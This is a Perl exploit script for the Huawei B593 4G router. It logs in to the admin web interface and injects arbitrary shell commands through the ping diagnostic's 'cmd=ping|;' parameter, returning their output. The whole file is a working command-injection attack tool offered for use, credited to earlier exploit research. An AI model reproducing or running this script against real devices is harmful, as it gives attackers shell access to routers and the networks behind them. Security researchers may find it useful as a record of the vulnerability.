#!/usr/bin/perl -wT --

# Copyright (c) 2013 Jari Turkia (jatu@hqcodeshop.fi)

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

# Exploit research by Mr. J. Ronkainen
# http://blog.asiantuntijakaveri.fi/2013/08/gaining-root-shell-on-huawei-b593-4g.html

# Version history:
# 0.1	19th Nov 2013	Initial version
#

use LWP::UserAgent;;
use HTTP::Cookies;
use Cwd 'abs_path';
use File::Basename;
use MIME::Base64;
use Data::Dumper;
use URI::Escape;

use strict;
use utf8;


#
# Log user in with a password
#
sub Login(\$$$)
{
    my ($ua_ref, $host, $pwd) = @_;
    my $POST_url = "http://$host/index/logout.cgi";
    my $encoded_pwd = encode_base64($pwd, '');  # No CR/LF at the end

    # Attempt logout
    my $response = $$ua_ref->post($POST_url);
    return 0 unless $response->is_success;

    # Attempt login
    $POST_url = "http://$host/index/login.cgi";
    my %params = ( 'Username' => 'admin',
                    'Password' => $encoded_pwd
                );
    $response = $$ua_ref->post($POST_url, \%params);
    return 0 unless $response->is_success;

    $$ua_ref->cookie_jar()->extract_cookies($response);	
	return 0 unless exists($$ua_ref->cookie_jar()->{COOKIES}{$host}{'/'}{'SessionID_R3'});

	my $sessionID_ref = $$ua_ref->cookie_jar()->{COOKIES}{$host}{'/'}{'SessionID_R3'};
# Debug: Session id we got
#warn $$sessionID_ref[1];

	return 1;
}

#
# Send a command via web-interface Ping-exploit
#
sub SendCommand(\$$$)
{
    my ($ua_ref, $host, $cmd) = @_;
	die "Cannot send pipe-char (|) in a command!" if ($cmd =~ /\|/);
	
    my $POST_url = "http://$host/html/management/excutecmd.cgi?cmd=ping|;";
	my $cmd_encoded = $cmd;
	$cmd_encoded =~ s/ /|/g;	# Spaces are pipes
	$POST_url .= uri_escape($cmd_encoded);
	$POST_url .= "&RequestFile=/html/management/diagnose.asp";

    my $response = $$ua_ref->post($POST_url);
    return 0 unless $response->is_success;

	sleep(1);	# Wait for 1 second for the command to complete.
	my $GET_url = "http://$host/html/management/pingresult.asp";
    $response = $$ua_ref->get($GET_url);
    return 0 unless $response->is_success;

	my $cmd_output = $response->content();
	$cmd_output =~ s/\\n" \+ "/\n/g;
	return $1 if ($cmd_output =~ /"(.*)__finshed__/s);	# Yep, it's a typo in Huawei's web interface
	
	# Something went wrong with the command output
	return "";
}


#
# Script begins here
#

# Confirm parameters
my $B593_host = $ARGV[0];
my $admin_password = $ARGV[1];
my $cmd_to_run = $ARGV[2];

# Set up User-Agent for doing requests
die "Weird script path!" if (dirname(abs_path($0)) !~ m:^(/.+)$:);
my $script_dir = $1;
my $cookie_jar = HTTP::Cookies->new('file' => "$script_dir/cookies.txt",
                                    'autosave' => 1,		# save on destructor
									'ignore_discard' => 1);	# save all cookies, even session ones
$cookie_jar->set_cookie(0, 'SessionID_R3', '0', '/', $B593_host, 80, 0, 0, 86400, 0);
$cookie_jar->set_cookie(0, 'FirstMenu', 'Admin_0', '/', $B593_host, 80, 0, 0, 86400, 0);
$cookie_jar->set_cookie(0, 'SecondMenu', 'Admin_0_0', '/', $B593_host, 80, 0, 0, 86400, 0);
$cookie_jar->set_cookie(0, 'ThirdMenu', 'Admin_0_0_0', '/', $B593_host, 80, 0, 0, 86400, 0);
$cookie_jar->set_cookie(0, 'Language', 'en', '/', $B593_host, 80, 0, 0, 86400, 0);

my $ua = LWP::UserAgent->new;
$ua->timeout(10);
$ua->cookie_jar($cookie_jar);

# Login
die "Could not login!" if (!Login($ua, $B593_host, $admin_password));

# Execute a command
print SendCommand($ua, $B593_host, $cmd_to_run);
exit(0);
